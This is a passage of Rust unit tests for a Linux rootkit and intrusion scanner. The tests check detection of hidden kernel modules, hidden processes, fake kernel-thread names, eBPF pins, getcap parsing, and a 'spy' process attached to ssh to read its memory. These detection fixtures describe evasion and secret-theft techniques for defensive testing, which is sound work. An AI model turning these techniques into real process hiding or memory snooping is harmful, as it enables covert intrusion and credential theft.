    fn a_taint_no_loaded_module_accounts_for_is_a_hidden_module() {
        let (dir, index) = fixture();
        let root = dir.path();
        let hidden = |root: &Path| -> (Vec<RuleId>, Vec<String>) {
            let live = look(root, &index, Origin::System);
            (
                live.items
                    .iter()
                    .filter(|item| item.path == "sys/module")
                    .flat_map(|item| item.alerts.iter().map(|(rule, _)| *rule))
                    .collect(),
                live.notes
                    .into_iter()
                    .filter(|note| note.contains("no loaded module accounts for it"))
                    .collect(),
            )
        };
        // Tainted as by an out-of-tree module (4096), and the loaded
        // modules say nothing of the kind.
        write(root, "sys/module/a/taint", "\n");
        write(root, "sys/module/rootkit/taint", "\n");
        assert_eq!(hidden(root), (vec![RuleId::RootkitSign], vec![]));
        // One of them says it did.
        write(root, "sys/module/rootkit/taint", "O\n");
        assert_eq!(hidden(root), (vec![], vec![]));
        // An installed out-of-tree module that is not loaded now may have
        // been: noted.
        write(root, "sys/module/rootkit/taint", "\n");
        write(root, "proc/modules", "a 1 0 - Live 0x0\n");
        let (alerts, notes) = hidden(root);
        assert!(
            alerts.is_empty() && notes.len() == 1,
            "{alerts:?} {notes:?}"
        );
        // Such a module explains only the taints it would have set: not a
        // module loaded by force (2), and a proprietary one (1) only where
        // the module that is not loaded has such a licence.
        for taint in ["4098\n", "4097\n"] {
            write(root, "proc/sys/kernel/tainted", taint);
            let (alerts, notes) = hidden(root);
            assert_eq!(alerts, [RuleId::RootkitSign], "{taint}");
            assert!(notes.is_empty(), "{taint} {notes:?}");
        }
        let modules = "usr/lib/modules/6.1-test";
        write(root, &format!("{modules}/extramodules/nvidia.ko.zst"), "nv");
        write(
            root,
            &format!("{modules}/modules.dep"),
            "kernel/a.ko.zst:\nextramodules/nvidia.ko.zst:\n",
        );
        let (alerts, notes) = hidden(root);
        assert!(
            alerts.is_empty() && notes.len() == 1,
            "{alerts:?} {notes:?}"
        );
        // One that is in the index of modules and not there as a file
        // could not have been loaded: it explains nothing.
        fs::remove_file(root.join(format!("{modules}/extramodules/nvidia.ko.zst"))).unwrap();
        assert_eq!(hidden(root).0, [RuleId::RootkitSign]);
    }

    #[test]
    fn every_process_number_is_tried_and_what_was_not_is_said() {
        use super::Status;
        // A hidden process far above the listed ones is found.
        let listed: HashSet<u32> = [1, 2, 700].into_iter().collect();
        let answers = |pid: u32| {
            (pid == 300_123).then(|| Status {
                name: "hidden".into(),
                group: pid,
                ..Status::default()
            })
        };
        assert_eq!(
            super::kernel::unlisted_among(&listed, 1..=400_000, &answers),
            (vec![(300_123, "hidden".to_string())], vec![])
        );
        // A searcher that dies takes its share of the numbers with it:
        // that share is named, not passed over as searched.
        let dying = |pid: u32| {
            assert!(pid != 300_500, "a searcher dies");
            None
        };
        let (suspects, not_searched) = super::kernel::unlisted_among(&listed, 1..=400_000, &dying);
        assert!(suspects.is_empty());
        assert_eq!(not_searched.len(), 1);
        assert!(not_searched[0].contains(&300_500));
        // The numbers go up to the kernel's limit, whatever is listed.
        let dir = TempDir::new("live-numbers");
        let root = dir.path();
        let index = PackageIndex::with_foreign(HashSet::new());
        let scope = |origin| Scope {
            root,
            home: None,
            index: &index,
            origin,
        };
        process(root, "7", "/usr/bin/x", &[], "");
        assert_eq!(super::kernel::highest_number(&scope(Origin::System), 7), 7);
        write(root, "proc/sys/kernel/ns_last_pid", "900\n");
        assert_eq!(
            super::kernel::highest_number(&scope(Origin::System), 7),
            900
        );
        write(root, "proc/sys/kernel/pid_max", "5000\n");
        assert_eq!(
            super::kernel::highest_number(&scope(Origin::System), 7),
            4999
        );
        // Within what is tried nothing is said; past it, a user's sweep
        // notes it and root's counts it as not checked.
        let running = super::processes(&root.join("proc"));
        let search = |origin, most| {
            let mut found = super::Found::default();
            super::kernel::hidden_processes(&scope(origin), &running, most, &mut found);
            (found.notes, found.unchecked)
        };
        assert_eq!(search(Origin::Root, 5000), (vec![], vec![]));
        let (notes, unchecked) = search(Origin::System, 100);
        assert!(unchecked.is_empty());
        assert_eq!(
            notes,
            [
                "process numbers go up to 4999: only the newest 100 and those the control groups name were tried in the search for hidden processes"
            ]
        );
        let (notes, unchecked) = search(Origin::Root, 100);
        assert!(notes.is_empty() && unchecked.len() == 1, "{unchecked:?}");
        let said = |origin| {
            let mut found = super::Found::default();
            super::kernel::say_not_searched(&scope(origin), &not_searched, &mut found);
            (found.notes, found.unchecked)
        };
        let (notes, unchecked) = said(Origin::Root);
        assert!(notes.is_empty() && unchecked.len() == 1);
        assert!(unchecked[0].ends_with("that part of the search failed"));
        let (notes, unchecked) = said(Origin::System);
        assert!(unchecked.is_empty() && notes.len() == 1);
    }

    #[test]
    fn root_says_when_it_cannot_list_the_pinned_ebpf_objects() {
        let dir = TempDir::new("live-bpf");
        let root = dir.path();
        let index = PackageIndex::with_foreign(HashSet::new());
        // No such filesystem: nothing to say.
        assert!(look(root, &index, Origin::Root).unchecked.is_empty());
        fs::create_dir_all(root.join("sys/fs/bpf")).unwrap();
        fs::set_permissions(root.join("sys/fs/bpf"), fs::Permissions::from_mode(0o000)).unwrap();
        let closed = fs::read_dir(root.join("sys/fs/bpf")).is_err();
        let as_root = look(root, &index, Origin::Root);
        let as_user = look(root, &index, Origin::System);
        fs::set_permissions(root.join("sys/fs/bpf"), fs::Permissions::from_mode(0o755)).unwrap();
        // Run as root, nothing is closed to the test.
        if !closed {
            return;
        }
        assert_eq!(as_root.unchecked.len(), 1, "{:?}", as_root.unchecked);
        assert!(as_root.unchecked[0].starts_with("/sys/fs/bpf: could not be listed"));
        assert!(as_user.unchecked.is_empty());
    }

    #[test]
    fn a_process_missing_from_the_list_is_found_by_its_number() {
        use super::Status;
        let listed: HashSet<u32> = [1, 2, 5].into_iter().collect();
        let answers = |pid: u32| match pid {
            // A process of its own, a thread of process 2, and one the
            // control groups name.
            3 | 9 => Some(Status {
                name: format!("hidden{pid}"),
                group: pid,
                ..Status::default()
            }),
            4 => Some(Status {
                name: "thread".into(),
                group: 2,
                ..Status::default()
            }),
            _ => None,
        };
        assert_eq!(
            super::kernel::unlisted(&listed, [0, 9, 5].into_iter().chain(1..8), &answers),
            [(9, "hidden9".to_string()), (3, "hidden3".to_string())]
        );
        let status = super::parse_status(
            "Name:\tkworker/0:1\nTgid:\t7\nPid:\t9\nPPid:\t2\nTracerPid:\t0\nUid:\t0\t0\t0\t0\n",
        );
        assert_eq!(
            status,
            Status {
                name: "kworker/0:1".into(),
                group: 7,
                parent: 2,
                tracer: 0,
                of_root: true
            }
        );
        // The members of every control group are read.
        let dir = TempDir::new("live-cgroups");
        let index = PackageIndex::with_foreign(HashSet::new());
        write(dir.path(), "sys/fs/cgroup/cgroup.procs", "1\n2\n");
        write(
            dir.path(),
            "sys/fs/cgroup/user.slice/a.scope/cgroup.procs",
            "0\n77\n",
        );
        let members = |origin, most| {
            let scope = Scope {
                root: dir.path(),
                home: None,
                index: &index,
                origin,
            };
            let mut found = super::Found::default();
            let mut members = super::kernel::members_of_control_groups(&scope, most, &mut found);
            members.sort_unstable();
            (members, found.notes, found.unchecked)
        };
        assert_eq!(
            members(Origin::System, 3),
            (vec![0, 1, 2, 77], vec![], vec![])
        );
        // Groups past the bound are said to be left out: a note in a
        // user's sweep, not checked for root.
        let left = "more than 2 control groups: the processes the rest name were not tried in the search for hidden processes";
        assert_eq!(
            members(Origin::System, 2),
            (vec![1, 2], vec![left.to_string()], vec![])
        );
        assert_eq!(
            members(Origin::Root, 2),
            (vec![1, 2], vec![], vec![left.to_string()])
        );
    }

    #[test]
    fn a_program_named_like_a_kernel_thread_and_an_attached_process_are_said() {
        let (dir, index) = system(
            "live-attached",
            &[("usr/bin/ssh", "ssh"), ("usr/bin/gdb", "gdb")],
        );
        let root = dir.path();
        for path in ["home/u/.local/k", "home/u/spy", "home/u/app"] {
            write(root, path, path);
        }
        let status = |pid: &str, name: &str, parent: u32, tracer: u32| {
            detail(
                root,
                pid,
                "status",
                &format!(
                    "Name:\t{name}\nTgid:\t{pid}\nPid:\t{pid}\nPPid:\t{parent}\nTracerPid:\t{tracer}\n"
                ),
            );
        };
        // A kernel thread: no program, no command line.
        status("2", "kthreadd", 0, 0);
        status("3", "kworker/0:1", 2, 0);
        // A program that calls itself one, either way.
        process(root, "60", "/home/u/.local/k", &[], "");
        detail(root, "60", "cmdline", "[kworker/0:2]\0");
        status("60", "k", 1, 0);
        process(root, "61", "/home/u/.local/k", &[], "");
        detail(root, "61", "cmdline", "k\0");
        status("61", "[kthreadd]", 1, 0);
        // Something attached to a program that holds secrets.
        process(root, "70", "/usr/bin/ssh", &[], "");
        status("70", "ssh", 1, 71);
        process(root, "71", "/home/u/spy", &[], "");
        status("71", "spy", 1, 0);
        // A packaged debugger at work, a program started under what
        // traces it, and something attached to a program it did not
        // start.
        process(root, "72", "/home/u/app", &[], "");
        status("72", "app", 1, 73);
        process(root, "73", "/usr/bin/gdb", &[], "");
        status("73", "gdb", 1, 0);
        process(root, "74", "/home/u/app", &[], "");
        status("74", "app", 75, 75);
        process(root, "75", "/home/u/spy", &[], "");
        status("75", "spy", 1, 0);
        process(root, "76", "/home/u/app", &[], "");
        status("76", "app", 1, 75);
        // eBPF pins: systemd's own, and one nothing explains.
        write(root, "sys/fs/bpf/systemd/x", "");
        write(root, "sys/fs/bpf/hook", "");
        let live = look(root, &index, Origin::System);
        assert_eq!(
            listed(&live),
            [
                ("home/u/.local/k", vec![RuleId::RootkitSign]),
                ("home/u/spy:attached-to-app", vec![RuleId::TracedProcess]),
                ("home/u/spy:attached-to-ssh", vec![RuleId::TracedSecrets]),
                ("sys/fs/bpf/hook", vec![RuleId::KernelTap]),
            ]
        );
        let spy = live
            .items
            .iter()
            .find(|item| item.path == "home/u/spy:attached-to-ssh")
            .unwrap();
        assert_eq!(
            spy.notes,
            ["process 71 is attached to process 70 (ssh) and can read its memory"]
        );
    }

    #[test]
    fn processes_root_cannot_read_are_a_finding_for_root_only() {
        let dir = TempDir::new("live-unreadable");
        let root = dir.path();
        let index = PackageIndex::with_foreign(HashSet::new());
        process(root, "90", "/usr/bin/x", &[], "");
        let closed = root.join("proc/90");
        fs::set_permissions(&closed, fs::Permissions::from_mode(0o000)).unwrap();
        // Run as root, nothing is closed to the test.
        let readable = fs::read_link(closed.join("exe")).is_ok();
        let as_user = look(root, &index, Origin::System);
        let as_root = look(root, &index, Origin::Root);
        fs::set_permissions(&closed, fs::Permissions::from_mode(0o755)).unwrap();
        if readable {
            return;
        }
        assert!(as_user.items.is_empty(), "{:?}", as_user.items);
        assert!(
            as_user
                .notes
                .iter()
                .any(|note| note.contains("the root checks cover them"))
        );
        assert_eq!(listed(&as_root), [("proc", vec![RuleId::RootkitSign])]);
    }

    #[test]
    fn what_an_interpreter_was_told_is_part_of_its_listeners_name() {
        let told = |arguments: &[&str]| {
            super::told(
                &running("/usr/bin/python3", arguments, None, ""),
                "usr/bin/python3",
            )
        };
        assert_eq!(
            told(&["python3", "-m", "http.server"]).as_deref(),
            Some("http.server")
        );
        assert_eq!(told(&["python3"]), None);
        // Code is named by its hash: another line of code is another item.
        let one = told(&["python3", "-c", "import socket; s = socket.socket()"]).unwrap();
        let other = told(&["python3", "-c", "import socket; t = socket.socket()"]).unwrap();
        assert!(
            one.starts_with("code-") && one.len() == 17 && one != other,
            "{one} {other}"
        );
        // A name holds nothing that reads as a path.
        assert_eq!(told(&["python3", "../x y"]).unwrap().len(), 17);
        assert_eq!(super::plain("a/b:c"), "a_b_c");
        assert_eq!(super::plain(".."), "_");
        // A program that is no interpreter was told nothing.
        assert_eq!(
            super::told(
                &running("/usr/bin/nginx", &["nginx", "x"], None, ""),
                "usr/bin/nginx"
            ),
            None
        );
    }

    #[test]
    fn no_getcap_output_makes_its_reader_panic_and_what_is_read_is_a_path_with_clauses() {
        use crate::test_support::Rng;

        const PIECES: &[&str] = &[
            "/usr/bin/demo",
            "/usr/bin/a b",
            "/",
            " ",
            "  ",
            "\n",
            "\r",
            "=ep",
            "+ep",
            "-ep",
            "cap_net_raw",
            "cap_kill,cap_chown",
            "41",
            "=",
            "+",
            "-",
            "e",
            "i",
            "p",
            ",",
            " [rootid=1000]",
            "[rootid=",
            "]",
            "é",
            "\u{1f600}",
            "\u{0}",
            "\t",
            "x",
        ];
        let output = "/usr/bin/python3 =ep\n/usr/bin/a b cap_kill+ep cap_chown+i\n/usr/bin/x cap_net_raw=ep [rootid=1000]\nno clause here\n";
        assert_eq!(parse_getcap(output).len(), 3);

        let check = |text: &str| {
            let lines = text.lines().count();
            let found = parse_getcap(text);
            // At most one file for each line, never one without clauses.
            assert!(found.len() <= lines, "{text:?}");
            for (path, capabilities) in found {
                assert!(!path.contains('\n') && !capabilities.is_empty(), "{text:?}");
                assert!(
                    capabilities.split(' ').all(super::is_clause),
                    "{text:?}: {capabilities:?}"
                );
            }
        };
        let mut rng = Rng::new(41);
        for _ in 0..10_000 {
            check(&rng.text(PIECES, 14));
            check(&rng.mutated(output, PIECES));
        }
    }

    /// What a sweep said it could not read, as a user's sweep notes it
    /// and as the root checks leave it unchecked.
    fn unread(root: &Path, index: &PackageIndex) -> (Vec<String>, Vec<String>) {
        let said = |sentences: Vec<String>| {
            let mut said: Vec<String> = sentences
                .into_iter()
                .filter(|sentence| sentence.contains("could not be"))
                .collect();
            said.sort();
            said
        };
        let as_user = look(root, index, Origin::System);
        let as_root = look(root, index, Origin::Root);
        // Never both ways at once.
        assert_eq!(said(as_user.unchecked), [""; 0]);
        assert_eq!(said(as_root.notes), [""; 0]);
        (said(as_user.notes), said(as_root.unchecked))
    }

    #[test]
    fn a_kernel_source_that_is_there_and_cannot_be_read_is_said() {
        let pkgbase = "usr/lib/modules/6.1-test/pkgbase";
        let (dir, index) = system("live-unread", &[(pkgbase, "linux\n")]);
        let root = dir.path();
        write(root, "proc/sys/kernel/osrelease", "6.1-test\n");
        write(root, "usr/lib/modules/6.1-test/modules.dep", "");
        process(root, "7", "/usr/bin/x", &[], "");
        // What is not there is a kernel without it: nothing to say.
        assert_eq!(unread(root, &index), (vec![], vec![]));
        // A directory where a file belongs and a file where a directory
        // does are there, and are not read by root either.
        for file in ["proc/modules", "proc/net/tcp", "proc/net/packet"] {
            fs::create_dir_all(root.join(file)).unwrap();
        }
        write(root, "sys/module", "no directory");
        let (notes, unchecked) = unread(root, &index);
        assert_eq!(notes, unchecked);
        assert_eq!(unchecked.len(), 4, "{unchecked:?}");
        for (said, (start, end)) in unchecked.iter().zip([
            (
                "/proc/modules: could not be read (",
                "); loaded kernel modules were not checked",
            ),
            (
                "/proc/net/packet: could not be read (",
                "); raw packet sockets were not checked",
            ),
            (
                "/proc/net/tcp: could not be read (",
                "); the sockets it lists were not checked",
            ),
            (
                "/sys/module: could not be read (",
                "); a module the kernel's list does not show was not looked for",
            ),
        ]) {
            assert!(said.starts_with(start) && said.ends_with(end), "{said}");
        }
    }

    #[test]
    fn a_kernel_release_or_a_list_of_processes_that_cannot_be_read_is_said() {
        let (dir, index) = system("live-unread-release", &[]);
        let root = dir.path();
        // A release that names no directory.
        write(root, "proc/sys/kernel/osrelease", "../x\n");
        let nameless = "/proc/sys/kernel/osrelease: names no kernel release; loaded kernel modules were not checked";
        assert_eq!(
            look(root, &index, Origin::System).notes,
            [nameless.to_string()]
        );
        assert_eq!(
            look(root, &index, Origin::Root).unchecked,
            [nameless.to_string()]
        );
        // One that cannot be read.
        fs::remove_file(root.join("proc/sys/kernel/osrelease")).unwrap();
        fs::create_dir_all(root.join("proc/sys/kernel/osrelease")).unwrap();
        let (notes, unchecked) = unread(root, &index);
        assert_eq!(notes, unchecked);
        assert_eq!(unchecked.len(), 1, "{unchecked:?}");
        assert!(
            unchecked[0].starts_with("/proc/sys/kernel/osrelease: could not be read (")
                && unchecked[0].ends_with("); loaded kernel modules were not checked"),
            "{unchecked:?}"
        );
        // The tables of another network namespace, read through a process
        // in it; not those of a process that is gone by then.
        fs::remove_dir_all(root.join("proc/sys")).unwrap();
        process(root, "7", "/usr/bin/x", &[], "");
        fs::create_dir_all(root.join("proc/self/ns")).unwrap();
        symlink("net:[1]", root.join("proc/self/ns/net")).unwrap();
        fs::create_dir_all(root.join("proc/7/ns")).unwrap();
        symlink("net:[2]", root.join("proc/7/ns/net")).unwrap();
        assert_eq!(unread(root, &index), (vec![], vec![]));
        fs::create_dir_all(root.join("proc/7/net/udp")).unwrap();
        let elsewhere = "the sockets of 1 other network namespace(s) could not be read; connections there were not checked";
        assert_eq!(
            unread(root, &index),
            (vec![elsewhere.to_string()], vec![elsewhere.to_string()])
        );
        // No list of processes at all, where there is a `/proc`.
        let dir = TempDir::new("live-unread-proc");
        let root = dir.path();
        assert!(super::processes(&root.join("proc")).unlistable.is_none());
        write(root, "proc", "no directory");
        assert!(super::processes(&root.join("proc")).unlistable.is_some());
        let (notes, unchecked) = unread(root, &index);
        assert_eq!(notes, unchecked);
        assert!(
            unchecked.iter().any(|said| {
                said.starts_with("/proc: could not be listed (")
                    && said.ends_with("); running processes were not checked")
            }),
            "{unchecked:?}"
        );
    }

    #[test]
    fn directories_the_search_for_setuid_programs_cannot_list_are_said_once() {
        use super::Closed;
        let dir = TempDir::new("live-closed");
        let root = dir.path();
        let index = PackageIndex::with_foreign(HashSet::new());
        let scope = |origin| Scope {
            root,
            home: None,
            index: &index,
            origin,
        };
        // One sentence however many there are: a note that leaves them to
        // the root checks for a user, not checked for root.
        let say = |origin, directories: &[&str]| {
            let mut closed = Closed::default();
            for directory in directories {
                closed.add(directory);
            }
            let mut found = super::Found::default();
            closed.say(&scope(origin), &mut found);
            (found.notes, found.unchecked)
        };
        assert_eq!(say(Origin::Root, &[]), (vec![], vec![]));
        assert_eq!(say(Origin::System, &[]), (vec![], vec![]));
        assert_eq!(
            say(Origin::Root, &["var/lib/x", "root", "var/a"]),
            (
                vec![],
                vec![
                    "setuid programs were not looked for in 3 place(s) that could not be listed (/root among them)"
                        .to_string()
                ]
            )
        );
        assert_eq!(
            say(Origin::System, &["var/lib/x", "root"]),
            (
                vec![
                    "setuid programs were not looked for in 2 place(s) that could not be listed; the root checks cover them"
                        .to_string()
                ],
                vec![]
            )
        );
        // The walk itself: what it can list, and what is no directory,
        // is nothing to say.
        write(root, "usr/local/bin/x", "x");
        write(root, "etc", "no directory");
        fs::create_dir_all(root.join("var/closed/below")).unwrap();
        let walk = |origin| {
            let mut found = super::Found::default();
            super::privileged_files(&scope(origin), &mut found);
            (found.notes, found.unchecked)
        };
        assert_eq!(walk(Origin::System), (vec![], vec![]));
        assert_eq!(walk(Origin::Root), (vec![], vec![]));
        // A directory closed to the reader. Nothing is closed to root, who
        // walks into it like any other.
        let closed = root.join("var/closed");
        fs::set_permissions(&closed, fs::Permissions::from_mode(0o000)).unwrap();
        let is_closed = fs::read_dir(&closed).is_err();
        let (as_user, as_root) = (walk(Origin::System), walk(Origin::Root));
        fs::set_permissions(&closed, fs::Permissions::from_mode(0o755)).unwrap();
        if is_closed {
            assert_eq!(as_user, say(Origin::System, &["var/closed"]));
            assert_eq!(as_root, say(Origin::Root, &["var/closed"]));
        } else {
            assert_eq!((as_user, as_root), ((vec![], vec![]), (vec![], vec![])));
        }
    }

    #[test]
    fn a_getcap_that_is_missing_or_does_not_finish_is_not_an_empty_answer() {
        use std::os::unix::process::ExitStatusExt;
        use std::process::ExitStatus;
        // A wait status holds the exit code in its second byte, and the
        // signal that ended the program in its first.
        let exited = |code: i32| ExitStatus::from_raw(code << 8);
        assert_eq!(super::getcap_failure(exited(0)), None);
        assert_eq!(
            super::getcap_failure(exited(124)).as_deref(),
            Some("getcap timed out")
        );
        assert_eq!(
            super::getcap_failure(exited(1)).as_deref(),
            Some("getcap failed: exit status: 1")
        );
        let killed = super::getcap_failure(ExitStatus::from_raw(9)).unwrap();
        assert!(killed.starts_with("getcap failed: signal: 9"), "{killed:?}");

        let dir = TempDir::new("live-getcap");
        let getcap = dir.path().join("getcap");
        assert_eq!(
            super::capabilities_below(&getcap, &[]),
            Err(format!("{} is not installed", getcap.display()))
        );
        if !crate::test_support::tool_available("/usr/bin/timeout")
            || !crate::test_support::tool_available("/bin/sh")
        {
            return;
        }
        // What it printed before it failed is not taken for the list.
        let listing = "#!/bin/sh\necho '/usr/bin/x cap_setuid=ep'\n";
        crate::test_support::write_script(&getcap, &format!("{listing}exit 1\n"));
        assert_eq!(
            super::capabilities_below(&getcap, &[]),
            Err("getcap failed: exit status: 1".to_string())
        );
        crate::test_support::write_script(&getcap, listing);
        assert_eq!(
            super::capabilities_below(&getcap, &[]),
            Ok(vec![("usr/bin/x".to_string(), "cap_setuid=ep".to_string())])
        );
    }

    #[test]
    fn a_place_closed_on_a_mount_without_set_id_is_told_apart() {
        use super::{Closed, mounts};

        let mountinfo = "\
36 1 8:2 / / rw,relatime shared:1 - ext4 /dev/sda2 rw
37 36 8:3 / /home rw,nosuid,relatime shared:2 - ext4 /dev/sda3 rw
90 37 0:50 / /home/u/remote rw,nosuid,nodev,relatime shared:60 - fuse.sshfs host: rw
91 37 0:51 / /home/u/my\\040drive rw,nosuid,nodev - fuse.rclone r: rw
92 37 8:17 / /home/u/disk rw,nodev - ext4 /dev/sdb1 rw
93 36 0:52 / /var/x rw,nosuid - tmpfs tmpfs rw
94 93 8:18 / /var/x rw - ext4 /dev/sdc1 rw
";
        let read = mounts(mountinfo);
        assert_eq!(read.len(), 7);
        assert!(read.contains(&("home/u/my drive".to_string(), true)));
        assert!(read.contains(&(String::new(), false)));
        let mut closed = Closed {
            mounts: read,
            ..Closed::default()
        };
        // On a mount without set-id, and below one.
        for covered in [
            "home/u/remote",
            "home/u/remote/below",
            "home/u/my drive",
            "home/x",
        ] {
            assert!(closed.without_set_id(covered), "{covered}");
            closed.add(covered);
        }
        assert_eq!((closed.covered, closed.count), (4, 0));
        assert_eq!(closed.covered_first.as_deref(), Some("home/u/my drive"));
        // A mount with set-id below one without, one mounted over one
        // without, and a name that only begins like a mount.
        for counted in ["home/u/disk/closed", "var/x/closed", "var/x2", "root"] {
            assert!(!closed.without_set_id(counted), "{counted}");
            closed.add(counted);
        }
        assert_eq!((closed.covered, closed.count), (4, 4));
        assert_eq!(closed.first.as_deref(), Some("home/u/disk/closed"));
        // With no mounts read (a user's search), nothing is told apart.
        assert!(!Closed::default().without_set_id("home/u/remote"));
        assert!(mounts("1 2 3\n").is_empty());
    }
}
